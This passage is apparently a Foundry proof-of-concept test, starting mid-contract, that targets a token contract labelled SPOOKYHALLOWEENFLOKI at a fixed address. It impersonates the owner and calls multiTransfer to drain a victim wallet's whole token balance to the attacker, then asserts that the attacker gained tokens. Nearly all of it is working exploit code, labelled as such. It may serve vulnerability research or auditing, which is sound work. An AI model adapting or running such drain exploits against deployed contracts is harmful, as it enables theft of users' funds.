    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890); // Fixed: Declared victim variable
    ISPOOKYHALLOWEENFLOKI spookyContract; // Fixed: Renamed from targetContract to avoid forge-std conflict

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        spookyContract = ISPOOKYHALLOWEENFLOKI(TARGET);
        vm.label(TARGET, "SPOOKYHALLOWEENFLOKI");
        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");

        // Inject tokens to victim wallet
        deal(TARGET, victim, 1_000_000 * 1e9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(TARGET).balanceOf(address(this));
        // Record initial balances
        uint256 initialAttackerBalance = spookyContract.balanceOf(attacker);
        uint256 victimBalance = spookyContract.balanceOf(victim);
        console.log("Victim balance before:", victimBalance);
        console.log("Attacker balance before:", initialAttackerBalance);

        require(victimBalance > 0, "Victim must have tokens");

        // Get owner address
        address owner = spookyContract.getOwner();
        console.log("Owner address:", owner);

        // Impersonate owner to call multiTransfer
        vm.startPrank(owner);

        // Create arrays for multiTransfer
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = victimBalance;

        // Exploit: Drain victim's tokens using multiTransfer
        spookyContract.multiTransfer(victim, recipients, amounts);

        vm.stopPrank();

        // Verify exploit succeeded
        uint256 finalAttackerBalance = spookyContract.balanceOf(attacker);
        uint256 finalVictimBalance = spookyContract.balanceOf(victim);

        console.log("Victim balance after:", finalVictimBalance);
        console.log("Attacker balance after:", finalAttackerBalance);

        // Assert attacker gained tokens
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker should have gained tokens");
        assertEq(finalVictimBalance, 0, "Victim should have 0 tokens after exploit");
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

